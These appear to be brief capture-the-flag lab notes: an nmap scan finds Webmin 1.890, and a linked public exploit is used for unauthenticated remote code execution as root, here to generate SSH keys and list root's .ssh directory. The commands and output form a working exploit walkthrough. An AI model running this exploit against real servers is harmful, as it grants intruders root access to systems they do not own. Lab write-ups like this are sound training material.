## Recon

```sh
─# nmap -sV -Pn -p1-65535 --min-rate 5000 $ip 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 14:17 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Host is up (0.65s latency).
Not shown: 52844 filtered tcp ports (no-response), 12689 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

found this one 

https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py


```
└─# python3 webmin_rce.py 10.10.194.13 10000 'ssh-keygen -t rsa -f ~/.ssh/id_rsa -N ""'      
                                       
--------------------------------

WebMin 1.890-expired-remote-root

<h1>Error - Perl execution failed</h1>
<p>Your password has expired, and a new one must be chosen.
total 20
drwx------ 2 root root 4096 Apr  5 18:39 .
drwx------ 5 root root 4096 Jun 26  2020 ..
-rw------- 1 root root  565 Apr  5 18:35 authorized_keys
-rw------- 1 root root 1675 Apr  5 18:39 id_rsa
-rw-r--r-- 1 root root  393 Apr  5 18:39 id_rsa.pub
</p>


```